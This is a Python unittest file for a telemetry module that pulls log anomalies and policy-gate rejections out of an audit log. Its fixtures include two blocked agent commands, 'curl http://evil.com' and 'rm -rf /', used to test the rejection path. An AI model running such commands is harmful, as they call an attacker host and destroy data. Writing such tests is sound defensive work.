#!/usr/bin/env python3
import json
import tempfile
import unittest
from pathlib import Path

from core.telemetry_seed import (
    extract_log_seeds,
    extract_audit_seeds,
    collect_all_seeds,
    write_seed_bank,
)


class TestTelemetrySeed(unittest.TestCase):

    def test_missing_directory_returns_empty(self):
        missing = Path("/path/to/definitely/nonexistent/dir")
        self.assertEqual(extract_log_seeds(missing), [])
        missing_file = Path("/path/to/nonexistent.jsonl")
        self.assertEqual(extract_audit_seeds(missing_file), [])

    def test_extract_anomalies(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = Path(tmp)
            f = d / "test.log"
            f.write_text("info: ok\nWARN: timeout fired on gate\npanic: cpu 0\n", encoding="utf-8")
            seeds = extract_log_seeds(d)
            self.assertEqual(len(seeds), 2)
            self.assertEqual(seeds[0]["line_no"], 2)
            self.assertIn("timeout", seeds[0]["raw_residue"])

    def test_extract_audit_rejections(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = Path(tmp)
            audit_file = d / "audit_log.jsonl"
            records = [
                {
                    "schema_version": "0.4.0",
                    "policy_passed": True,
                    "proposal": {"command": "ls", "target_path": "./repo", "risk_tier": 1},
                },
                {
                    "schema_version": "0.4.0",
                    "policy_passed": False,
                    "policy_reason": "Blocked: binary curl denied",
                    "effective_risk_tier": 2,
                    "proposal": {"command": "curl http://evil.com", "target_path": "./repo", "risk_tier": 1},
                },
            ]
            audit_file.write_text("\n".join(json.dumps(r) for r in records) + "\n", encoding="utf-8")

            seeds = extract_audit_seeds(audit_file)
            self.assertEqual(len(seeds), 1)
            self.assertEqual(seeds[0]["seed_type"], "admission_gate_rejection")
            self.assertEqual(seeds[0]["command"], "curl http://evil.com")
            self.assertEqual(seeds[0]["target_path"], "./repo")
            self.assertEqual(seeds[0]["reason"], "Blocked: binary curl denied")

    def test_collect_all_seeds_aggregation(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = Path(tmp)
            log_f = d / "node.log"
            log_f.write_text("ALERT: statutory veto active\n", encoding="utf-8")

            audit_f = d / "audit.jsonl"
            audit_f.write_text(
                json.dumps({
                    "policy_passed": False,
                    "policy_reason": "Vetoed",
                    "proposal": {"command": "rm -rf /", "target_path": "/"},
                }) + "\n",
                encoding="utf-8",
            )

            all_seeds = collect_all_seeds(log_dir=d, audit_path=audit_f)
            self.assertEqual(len(all_seeds), 2)


    def test_atomic_write_seed_bank(self):
        import tempfile
        import json
        from core.telemetry_seed import write_seed_bank

        with tempfile.TemporaryDirectory() as td:
            target = Path(td) / "subdir" / "seeds.json"
            data = [{"seed_id": "s1", "raw_residue": "test"}]
            write_seed_bank(data, target)
            self.assertTrue(target.is_file())
            loaded = json.loads(target.read_text(encoding="utf-8"))
            self.assertEqual(loaded, data)

if __name__ == "__main__":
    unittest.main()
